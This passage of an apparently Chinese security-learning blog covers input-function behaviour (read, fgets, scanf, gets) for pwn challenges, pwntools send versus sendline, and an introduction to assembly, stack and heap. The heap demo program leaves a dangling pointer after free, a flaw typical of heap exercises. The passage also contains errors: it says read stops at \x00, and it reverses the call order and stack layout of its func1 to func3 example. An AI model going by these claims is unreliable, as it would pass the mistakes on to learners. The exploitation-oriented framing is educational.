src="/../picture/talk1.0.0/2.png"></p><p>来到第二个sleep所在的地方<br>查看堆中内存，可以看到已经都变成22了，后面输入后改变我们就可以直观的看到<br><img src="/../picture/talk1.0.0/3.png"></p><p>来到第三个sleep所在的地方<br>查看堆的情况<br><img src="/../picture/talk1.0.0/4.png"></p><h3 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h3><p>继续跟进程序，让我们看看read，分别输入 <code>aaaaaa</code> <code>aaaaaaaa</code> <code>aaaaaaaaaa</code><br><img src="/../picture/talk1.0.0/5.png"><br>这里仔细的人会发现，<code>read a*6</code> 后面到 <code>read a*8</code> 中间除了输入还空了一行，这是因为包括 <code>\n</code><br>在内我们输入的全部东西都被读入了内存中，<code>getchar</code> 没有读取到<code>\n</code>所以我手动敲了一个回车来结束 <code>getchar</code></p><p>来到第四个sleep所在的地方<br>我们已经使用read输入了，下面我们来查看一下堆内存里面是什么<br><img src="/../picture/talk1.0.0/6.png"><br>可以看到输入六个a的话内存里面是 <code>六个a和一个回车符号</code><br>输入八个a的话内存里面是 <code>八个a，回车符号没有被读入</code><br>输入是十个a的话内存里面是 <code>十个a，回车符号没有被读入</code></p><p>虽然实验很简陋但是我们可以简单得出结论，read输入的话会读取指定的字节数，除非遇到<code>\x00</code>，不然输入其他东西都无法阻止read停止，直到读取完后放入指定的内存中，没读取到的部分则保持原样不动</p><h3 id="fgets函数"><a href="#fgets函数" class="headerlink" title="fgets函数"></a>fgets函数</h3><p>继续跟进程序，让我们看看fgets，再次分别输入 <code>aaaaaa</code> <code>aaaaaaaa</code> <code>aaaaaaaaaa</code><br><img src="/../picture/talk1.0.0/7.png"><br>查看对应的堆内存<br><img src="/../picture/talk1.0.0/8.png"><br>我们不难简单的得出结论，fgets和read不太一样，虽然我们设定了读取8个字节，他并不会老实读取8个字节，而是只读取7个，然后再主动添加一个<code>\x00</code>来作为输入的字符串的结尾</p><p>因此像read这样的输入函数，如果buf为8字节的字符串，用户输入8字节，而read傻傻的读取八字节，那么字符串结尾的<code>\x00</code>就会被省略掉，如果此时有一个 <code>buf2</code> 和 <code>buf</code> 的位置相邻，那么使用puts输出buf的时候就会连同buf2一起输出出来，因为buf失去了<code>\x00</code>，puts这类输出函数就没办法判断这个字符串什么时候结束，只能无脑输出，直到遇见<code>\x00</code></p><h3 id="scanf函数"><a href="#scanf函数" class="headerlink" title="scanf函数"></a>scanf函数</h3><p>继续跟进程序，让我们看看scanf,再次分别输入 <code>aaaaaa</code> <code>aaaaaaaa</code> <code>aaaaaaaaaa</code><br><img src="/../picture/talk1.0.0/9.png"><br>查看对应的堆内存<br><img src="/../picture/talk1.0.0/10.png"><br>可以发现我们的scanf函数非常的聪明，他不像fgets函数偷工减料，让他读取8字节他是真读取<br>并且同时他读取完八字节后，会再在后面加一个<code>\x00</code>来保持字符串的独立性</p><p>继续跟进程序，让我们看看gets,输入 <code>aaaaaa</code><br><img src="/../picture/talk1.0.0/11.png"><br>查看堆内存<br><img src="/../picture/talk1.0.0/12.png"></p><h4 id="scanf函数的溢出"><a href="#scanf函数的溢出" class="headerlink" title="scanf函数的溢出"></a>scanf函数的溢出</h4><p>最后来看看scanf(“%s”,bss)的溢出形式<br><img src="/../picture/talk1.0.0/13.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>read函数</code>:第三个参数是几就读取几个，一旦数量超过第三个参数后就直接忽略，就只读取到第三个参数所规定的数量为止，不会自动添加<code>\x00</code>,如果 <code>允许输入长度</code> <code>=</code> <code>字符串长度</code> 可能导致字符串失去结尾的<code>\x00</code></p><p><code>fgets函数</code>:读取的字节数为<code>第二个参数-1</code>,超出的部分会被忽略，会自动在最后添加<code>\x00</code></p><p><code>scanf(&quot;%?s&quot;, &amp;buf)</code>:读取?个字节,超出的部分会被忽略,然后在最末尾添加<code>\x00</code>。<code>scanf(&quot;%s&quot;, &amp;buf)</code>没有规定读取字节数，存在溢出</p><p><code>gets函数</code>:无脑读取，一直读取，直到用户输入回车才停止，输入的数据全部读取,但是最后会把读取到的回车(<code>\x0a</code>)变成<code>\x00</code></p><h3 id="send和sendline的选择"><a href="#send和sendline的选择" class="headerlink" title="send和sendline的选择"></a>send和sendline的选择</h3><p>对于上面函数如何选择 <code>send</code> 和 <code>sendline</code></p><ol><li><p>对于read函数 <code>send</code> 和 <code>sendline</code> 都可以，但是<code>建议使用send</code>，不然屁股后面多个<code>\x0a</code>，有时候打入<code>/bin/sh</code>字符串的时候使用sendline没发现有个<code>\x0a</code>在屁股上一直打不通也是很痛苦的</p></li><li><p>对于 <code>fgets</code> <code>gets</code> <code>scanf</code> 这三个函数只能使用sendline</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 基础知识 </category>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> read </tag>
            
            <tag> fgets </tag>
            
            <tag> scanf </tag>
            
            <tag> gets </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言基础与堆栈入门</title>
      <link href="/2024/06/13/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%A0%86%E6%A0%88%E5%85%A5%E9%97%A8/"/>
      <url>/2024/06/13/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%A0%86%E6%A0%88%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="啥是汇编语言-有啥用"><a href="#啥是汇编语言-有啥用" class="headerlink" title="啥是汇编语言?有啥用?"></a>啥是汇编语言?有啥用?</h3><p>深入了解计算机底层，我们会发现，计算机实际上只能执行一些非常基础的操作，但其速度却非常快。计算机的CPU只能执行机器码，即由一系列0和1组成的指令。不同的0和1组合会触发计算机中的不同电路，从而进行各种操作。由于这些0和1的组合很长，阅读起来不方便，因此通常以16进制形式显示。然而，即便如此，16进制的表示仍然难以理解。为了简化这一过程，汇编语言应运而生，它用更易读的符号来表示这些机器指令，从而使程序员能够更方便地编写和理解代码。</p><h3 id="啥是寄存器"><a href="#啥是寄存器" class="headerlink" title="啥是寄存器?"></a>啥是寄存器?</h3><p>计算机中的所有指令都是由CPU执行的。在计算机结构中，CPU和内存是分开的，而寄存器则位于CPU内部。CPU可以直接访问寄存器中的数据来执行各种指令操作。在程序执行过程中，数据通常从内存 –&gt; 缓存（cache）–&gt; 寄存器，只有到了寄存器中CPU才能对其进行处理。处理完成后，程序决定是否将寄存器中的数据写回内存，以更新内存中的内容。除了存储数据，寄存器还可以用于存储指令、地址、状态信息和其他控制数据。因此，寄存器在计算机中发挥着至关重要的作用，帮助提高处理速度和效率。<br>下图表介绍一些常用的寄存器<br><img src="/../picture/pwn1.1.1/2.png"></p><h3 id="什么是栈-什么是堆"><a href="#什么是栈-什么是堆" class="headerlink" title="什么是栈?什么是堆?"></a>什么是栈?什么是堆?</h3><p>先贴一张图用来理清楚堆和栈在程序中的位置<br><img src="/../picture/pwn1.1.1/1.png"></p><h5 id="栈的简单介绍"><a href="#栈的简单介绍" class="headerlink" title="栈的简单介绍"></a>栈的简单介绍</h5><p>在计算机程序运行时，系统会将可执行文件的<code>text段</code>（代码段）和<code>data段</code>（数据段）加载到内存中。在C语言等编程语言中，函数调用过程中需要<code>传递参数</code>并<code>创建局部变量</code>。如果这些数据都存储在<code>data段</code>或<code>bss段</code>中，会导致内存空间的浪费，并使得管理变得复杂。<br>为了高效管理函数的参数和局部变量，并在<code>函数调用结束后释放相关资源</code>，我们使用了<strong>栈</strong>。<strong>栈</strong>是一种<code>后进先出（LIFO）</code>的数据结构，它能够在函数调用时创建栈帧来存储函数的局部变量、参数、返回地址等信息。当函数调用结束时，栈帧会被自动销毁，从而释放内存，避免内存浪费。栈不仅节省内存，还确保了函数调用和返回过程的有序进行。</p><p><code>ESP</code>（栈指针）和 <code>EBP</code>（基址指针）之间的空间被称为<code>栈帧</code>。<code>栈帧</code>是一个函数调用的<code>栈上空间</code>，主要用于<code>存储函数的局部变量</code>、<code>参数</code>、<code>返回地址</code>以及<code>保存的寄存器状态</code>等信息。在每次函数调用时，都会为该函数分配一个新的栈帧，并在<code>函数执行完成后释放这个栈帧</code>。栈帧的结构通常如下：</p><ul><li>**栈顶 (由 <code>ESP</code> 指针指向)**：函数调用时，栈顶包含函数的局部变量和临时数据。</li><li>**栈底 (由 <code>EBP</code> 指针指向)**：栈底用于存储函数调用的参数和返回地址等。</li></ul><p><code>栈帧</code>的设计使得函数调用和返回变得高效，并且支持递归调用等复杂的函数调用模式。</p><h5 id="堆的简单介绍"><a href="#堆的简单介绍" class="headerlink" title="堆的简单介绍"></a>堆的简单介绍</h5><p>堆是用于存放进程运行中动态分配的内存段，其大小可以在运行时根据需求调整。调用<code>malloc</code>、<code>calloc</code>或<code>realloc</code>等函数时，会从堆上分配内存。释放内存时使用<code>free</code>函数，以便回收堆内存。堆内存的管理由程序员负责，不会自动释放，需要手动管理内存的分配和释放。</p><h5 id="浅浅总结一下"><a href="#浅浅总结一下" class="headerlink" title="浅浅总结一下:"></a>浅浅总结一下:</h5><p><code>栈</code>用于存放各个函数所需要使用的参数，比如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">30</span>];  <span class="comment">// str是一个局部变量，存储在栈上</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%29s&quot;</span>, str);  <span class="comment">// 读取字符串到str中</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);  <span class="comment">// 输出str的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>str</code>是一个局部数组，分配在栈上。</p><p><code>堆</code>则是用于存放用户的数据，并且由用户决定什么时候释放它。比如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_heap</span><span class="params">(<span class="type">char</span> **heap_memory)</span> &#123;</span><br><span class="line">    *heap_memory = (<span class="type">char</span> *)<span class="built_in">malloc</span>(BUFFER_SIZE * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">    <span class="keyword">if</span> (*heap_memory == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory allocation failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Heap memory created.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit_heap</span><span class="params">(<span class="type">char</span> *heap_memory)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (heap_memory == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Heap memory not created yet.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a string to store in heap memory: &quot;</span>);</span><br><span class="line">    fgets(heap_memory, BUFFER_SIZE, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    heap_memory[<span class="built_in">strcspn</span>(heap_memory, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Heap memory updated.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_heap</span><span class="params">(<span class="type">char</span> *heap_memory)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (heap_memory == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Heap memory not created yet.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(heap_memory);</span><br><span class="line">    heap_memory = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Heap memory deleted.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *heap_memory = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nMenu:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1. Create heap memory\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2. Edit heap memory\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3. Delete heap memory\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;4. Exit\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter your choice: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">        getchar();  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                create_heap(&amp;heap_memory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                edit_heap(heap_memory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                delete_heap(heap_memory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">if</span> (heap_memory != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(heap_memory);  </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Exiting program.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Invalid choice. Please try again.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(这里例子可能举的有点复杂…但是之后遇到的<code>堆</code>的题目大多也是类似这样的，所以堆的难度会比<code>栈</code>大很多，知识量也多很多)<br>总之上面的代码就是一般堆的用法，不需要理解，只是作为展示，大致内容如下:<br>输入1，用户可以<code>申请一个堆的空间</code>。<br>输入2，用户可以<code>编辑所申请到的空间</code>。<br>输入3，用户可以<code>删除申请到的空间</code>。</p><h3 id="常用汇编指令与C语言对比"><a href="#常用汇编指令与C语言对比" class="headerlink" title="常用汇编指令与C语言对比"></a>常用汇编指令与C语言对比</h3><ol><li><p><strong>MOV</strong></p><ul><li><strong>功能</strong>：将数据从一个位置复制到另一个位置。</li><li><strong>汇编</strong>：<code>MOV AX, 1234h</code></li><li><strong>C语言</strong>：<code>AX = 0x1234;</code></li><li><strong>说明</strong>：<code>MOV</code> 是把数据从源位置复制到目标位置，类似于C语言中的赋值操作。<code>MOV</code> 不改变源数据，只是复制到目标位置。</li></ul></li><li><p><strong>ADD &#x2F; SUB</strong></p><ul><li><strong>功能</strong>：进行加法和减法运算。</li><li><strong>汇编</strong>：<code>ADD AX, BX</code>（<code>AX = AX + BX</code>）；<code>SUB CX, 5</code>（<code>CX = CX - 5</code>）</li><li><strong>C语言</strong>：<code>AX += BX;</code>（<code>AX = AX + BX</code>）；<code>CX -= 5;</code>（<code>CX = CX - 5</code>）</li><li><strong>说明</strong>：<code>ADD</code> 和 <code>SUB</code> 用于对寄存器或内存中的值进行加减操作，更新结果并设置标志寄存器的状态。</li></ul></li><li><p><strong>INC &#x2F; DEC</strong></p><ul><li><strong>功能</strong>：递增或递减操作数。</li><li><strong>汇编</strong>：<code>INC AX</code>（<code>AX = AX + 1</code>）；<code>DEC BX</code>（<code>BX = BX - 1</code>）</li><li><strong>C语言</strong>：<code>AX++;</code>（<code>AX = AX + 1</code>）；<code>BX--;</code>（<code>BX = BX - 1</code>）</li><li><strong>说明</strong>：<code>INC</code> 和 <code>DEC</code> 只能对寄存器或内存位置操作，不能对立即数操作。</li></ul></li><li><p><strong>CMP</strong></p><ul><li><strong>功能</strong>：比较两个值，并设置标志寄存器状态。</li><li><strong>汇编</strong>：<code>CMP AX, BX</code>（<code>if (AX == BX)</code>）</li><li><strong>C语言</strong>：<code>if (AX == BX)</code>（<code>AX</code> 和 <code>BX</code> 比较）</li><li><strong>说明</strong>：<code>CMP</code> 实际上是做了 <code>AX - BX</code> 的操作然后判断是否等于0，更新状态标志。</li></ul></li><li><p><strong>JMP</strong></p><ul><li><strong>功能</strong>：无条件跳转到指定的地址。</li><li><strong>汇编</strong>：<code>JMP start</code></li><li><strong>C语言</strong>：<code>goto start;</code></li><li><strong>说明</strong>：<code>JMP</code> 改变程序的执行流，跳转到标记为 <code>start</code> 的位置。</li></ul></li><li><p><strong>JE &#x2F; JNE &#x2F; JZ &#x2F; JNZ</strong></p><ul><li><strong>功能</strong>：根据条件跳转到指定地址。</li><li><strong>汇编</strong>：<code>JE equal</code>（<code>if (zero flag) goto equal;</code>）；<code>JNE not_equal</code>（<code>if (not equal) goto not_equal;</code>）</li><li><strong>C语言</strong>：<code>if (flag == 0) goto equal;</code>（<code>JE</code> 跳转条件为零标志）；<code>if (flag != 0) goto not_equal;</code>（<code>JNE</code> 跳转条件为非零）</li><li><strong>说明</strong>：这些指令依据先前比较操作的结果决定是否跳转。</li></ul></li><li><p><strong>CALL &#x2F; RET</strong></p><ul><li><strong>功能</strong>：调用和返回函数。</li><li><strong>汇编</strong>：<code>CALL myFunction</code>（调用函数）；<code>RET</code>（返回函数）</li><li><strong>C语言</strong>：<code>myFunction();</code>（调用函数）；<code>return;</code>（从函数返回）</li><li><strong>说明</strong>：<code>CALL</code> 会保存当前的返回地址，并跳转到目标函数；<code>RET</code> 从栈中恢复返回地址并跳转回。</li></ul></li><li><p><strong>PUSH &#x2F; POP</strong></p><ul><li><strong>功能</strong>：压入或弹出栈数据。</li><li><strong>汇编</strong>：<code>PUSH AX</code>（压入栈）；<code>POP BX</code>（从栈中弹出）</li><li><strong>C语言</strong>：<code>stack.push(AX);</code>（假设有栈操作的C语言函数）；<code>BX = stack.pop();</code>（假设有栈操作的C语言函数）</li><li><strong>说明</strong>：<code>PUSH</code> 和 <code>POP</code> 操作栈，<code>PUSH</code> 将数据压入栈顶，<code>POP</code> 从栈顶弹出数据。</li></ul></li><li><p><strong>NOP</strong></p><ul><li><strong>功能</strong>：空操作，不产生任何效果。</li><li><strong>汇编</strong>：<code>NOP</code></li><li><strong>C语言</strong>：没有直接的C语言对应，可以理解为一个空的操作(或者可以理解成C语言的注释符号)。</li><li><strong>说明</strong>：<code>NOP</code> 通常用于占位或调试，不会改变程序状态。</li></ul></li><li><p><strong>LEA</strong></p><ul><li><strong>功能</strong>：加载有效地址，将计算得到的地址赋给寄存器。</li><li><strong>汇编</strong>：<code>LEA AX, [BX+SI]</code></li><li><strong>C语言</strong>：<code>AX = &amp;array[BX + SI];</code>（假设 <code>array</code> 是一个数组）</li><li><strong>说明</strong>：<code>LEA</code> 计算一个地址并将其存入寄存器，类似于获取指针地址而不实际访问内存。</li></ul></li><li><p><strong>AND &#x2F; OR &#x2F; XOR &#x2F; NOT</strong></p><ul><li><strong>功能</strong>：按位操作。</li><li><strong>汇编</strong>：<code>AND AX, BX</code>（按位与）；<code>OR AX, BX</code>（按位或）；<code>XOR AX, BX</code>（按位异或）；<code>NOT AX</code>（按位取反）</li><li><strong>C语言</strong>：<code>AX = AX &amp; BX;</code>（按位与）；<code>AX = AX | BX;</code>（按位或）；<code>AX = AX ^ BX;</code>（按位异或）；<code>AX = ~AX;</code>（按位取反）</li><li><strong>说明</strong>：这些指令用于位级操作，<code>AND</code> 和 <code>OR</code> 用于逻辑运算，<code>XOR</code> 用于位翻转，<code>NOT</code> 对每一位取反。</li></ul></li></ol><p>这里重点介绍一下<code>PUSH</code> <code>POP</code> 这两个指令<br><code>PUSH</code>和<code>POP</code>是对<code>栈</code>进行操作的指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">我 是 栈 ↓</span><br><span class="line">  ----</span><br><span class="line"> |  5 |  &lt;- 栈底ebp:注意，我是栈底，我在高地址</span><br><span class="line">  ----</span><br><span class="line"> |  4 |</span><br><span class="line">  ----</span><br><span class="line"> |  3 |</span><br><span class="line">  ----</span><br><span class="line"> |  2 |</span><br><span class="line">  ----</span><br><span class="line"> |  1 |  &lt;- 栈顶esp:注意，我是栈顶，我在低地址</span><br><span class="line">  ----</span><br><span class="line">假设这是栈最开始的样子</span><br><span class="line">假设：</span><br><span class="line">  eax = 6</span><br><span class="line">  ebx = 7</span><br></pre></td></tr></table></figure><p>我浅浅画了一个非常抽象的<code>栈</code>，但是这并不影响我们理解它。<br>当我们执行 <code>POP ebx</code> 这个指令后，那么就会让栈变成这个样子↓</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">我 是 栈 ↓</span><br><span class="line">  ----</span><br><span class="line"> |  5 |  &lt;- 栈底ebp:我不动，与我无瓜</span><br><span class="line">  ----</span><br><span class="line"> |  4 |</span><br><span class="line">  ----</span><br><span class="line"> |  3 |</span><br><span class="line">  ----</span><br><span class="line"> |  2 |  &lt;- 栈顶esp:执行完POP后，我会向高地址移动，现在我指向2了</span><br><span class="line">  ----</span><br><span class="line"> |  1 |  &lt;-- 1没有消失，只是不在esp和ebp之间的栈帧了，这导致我们无法直接访问</span><br><span class="line">  ----</span><br><span class="line"></span><br><span class="line">  eax = 6</span><br><span class="line">  ebx = 1 &lt;-- 注意注意，ebx变成1了</span><br></pre></td></tr></table></figure><p>然后来看看<code>PUSH eax</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">我 是 栈 ↓</span><br><span class="line">  ----</span><br><span class="line"> |  5 |  &lt;- 栈底ebp:我还是不动，依旧与我无瓜</span><br><span class="line">  ----</span><br><span class="line"> |  4 |</span><br><span class="line">  ----</span><br><span class="line"> |  3 |</span><br><span class="line">  ----</span><br><span class="line"> |  2 |  </span><br><span class="line">  ----</span><br><span class="line"> |  6 |  &lt;- 栈顶esp:执行完PUSH后，我会向低地址地址移动，并且将eax的值，也就是6   </span><br><span class="line">  ----      放入栈当中，替换掉了1</span><br><span class="line">  </span><br><span class="line">  eax = 6</span><br><span class="line">  ebx = 1 </span><br></pre></td></tr></table></figure><h3 id="为什么函数调用需要用栈"><a href="#为什么函数调用需要用栈" class="headerlink" title="为什么函数调用需要用栈"></a>为什么函数调用需要用栈</h3><p>首先为什么<code>栈</code>是<code>后进先出(LIFO)</code>，这样的设计是因为程序的执行符合一种将复杂的大问题拆解成一个个小问题来解决的思想。<br>大问题的解决需要小问题的答案，而小问题得到答案之后就可以抛弃了。<br>比如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> <span class="comment">// 如果需要使用标准输入输出函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func2</span><span class="params">()</span> &#123;</span><br><span class="line">    func1();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123;</span><br><span class="line">    func2();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func3();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这个程序的执行流程就是 <code>main --&gt; func1 --&gt; func2 --&gt; func3 --&gt; printf</code><br>那么栈的空间就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> ---------------</span><br><span class="line">| main 的栈空间  |  &lt;- 栈底 ebp(高地址)</span><br><span class="line"> ---------------</span><br><span class="line">| func1 的栈空间 |</span><br><span class="line"> ---------------</span><br><span class="line">| func2 的栈空间 |</span><br><span class="line"> ---------------</span><br><span class="line">| func3 的栈空间 |</span><br><span class="line"> ---------------</span><br><span class="line">| printf 的栈空间|  &lt;- 栈顶 esp(低地址)</span><br><span class="line"> ---------------</span><br></pre></td></tr></table></figure><p>我们得出规律，大问题函数程序总是最后消失<br>也就是<code>调用者</code>的生命周期总是长于<code>被调用者</code><br>这恰好符合了<code>栈</code>的<code>FILO</code>的特点。所以<code>栈</code>一定不是被随意设计的，而是一种完美符合计算机程序设计思想的一种数据结构</p><p>参考文献:<br><a href="https://www.cnblogs.com/tolin/p/14982094.html">什么是堆？什么是栈？他们之间有什么区别和联系？ - tolin 